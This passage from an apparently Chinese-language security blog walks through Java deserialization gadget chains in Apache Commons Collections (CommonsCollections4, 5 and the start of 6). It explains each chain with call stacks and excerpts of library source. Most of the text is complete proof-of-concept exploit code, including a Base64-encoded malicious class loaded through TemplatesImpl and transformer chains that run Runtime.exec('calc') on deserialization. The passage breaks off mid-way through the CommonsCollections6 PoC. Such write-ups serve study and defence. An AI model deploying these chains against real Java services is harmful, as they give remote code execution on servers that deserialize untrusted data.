args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAxTGNvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAUVGVzdFRyYW5zZm9ybWVyLmphdmEMAAoACwcAKAEAL2NvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAbY29tL2V4YW1wbGUvVGVzdFRyYW5zZm9ybWVyAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAEY2FsYwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjU0MDQzOTYxNzA2NjcwMAEAIEx5c29zZXJpYWwvUHduZXI1NDA0Mzk2MTcwNjY3MDA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAHAAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAIgAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAJwAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TrAXFilter.class, TrAXFilter.class&#125;);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(queue);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用栈如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">defineClass:<span class="number">142</span>, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:<span class="number">346</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:<span class="number">383</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">418</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">&lt;init&gt;:<span class="number">64</span>, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">transform:<span class="number">32</span>, InstantiateTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">compare:<span class="number">81</span>, TransformingComparator (org.apache.commons.collections4.comparators)</span><br><span class="line">siftDownUsingComparator:<span class="number">721</span>, PriorityQueue (java.util)</span><br><span class="line">siftDown:<span class="number">687</span>, PriorityQueue (java.util)</span><br><span class="line">heapify:<span class="number">736</span>, PriorityQueue (java.util)</span><br><span class="line">readObject:<span class="number">795</span>, PriorityQueue (java.util)</span><br><span class="line">...</span><br><span class="line">main:<span class="number">40</span>, CommonsCollections4 (com.example)</span><br></pre></td></tr></table></figure></div>

<h3 id="CommonsCollections5（BadAttributeValueExpException→TiedMapEntry）"><a href="#CommonsCollections5（BadAttributeValueExpException→TiedMapEntry）" class="headerlink" title="CommonsCollections5（BadAttributeValueExpException→TiedMapEntry）"></a>CommonsCollections5（BadAttributeValueExpException→TiedMapEntry）</h3><p><code>javax.management.BadAttributeValueExpException</code> 在反序列化 <code>readObject</code> 时如果满足 <code>System.getSecurityManager() == null</code> 条件时会对其中的 <code>val</code> 成员调用 <code>toString</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而 <code>TiedMapEntry</code> 的 <code>toString</code> 方法最终会调用到 <code>map.get</code> 方法，正好可以与 <code>LazyMap</code> 的利用链结合。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>POC 如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;sky&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(exception, <span class="string">&quot;val&quot;</span>, entry);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(exception);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">toString:132, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">readObject:86, BadAttributeValueExpException (javax.management)</span><br><span class="line">...</span><br><span class="line">main:41, CommonsCollections5 (com.example)</span><br></pre></td></tr></table></figure></div>

<h3 id="CommonsCollections6（HashMap→TiedMapEntry→LazyMap）"><a href="#CommonsCollections6（HashMap→TiedMapEntry→LazyMap）" class="headerlink" title="CommonsCollections6（HashMap→TiedMapEntry→LazyMap）"></a>CommonsCollections6（HashMap→TiedMapEntry→LazyMap）</h3><p><code>org.apache.commons.collections.keyvalue.TiedMapEntry</code> 的 <code>hashCode</code> 方法会调用到内部成员 <code>map</code> 的 <code>get</code> 方法，如果 <code>map</code> 被 <code>LazyMap</code> 修饰过就可以调用到 <code>transform</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry, KeyValue, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8453869361373831205L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getKey</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>java.util.HashMap#readObject</code> 方法会对 <code>key</code> 调用 <code>hash</code> 方法，进而调用 <code>key</code> 的 <code>hashCode</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>poc 如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 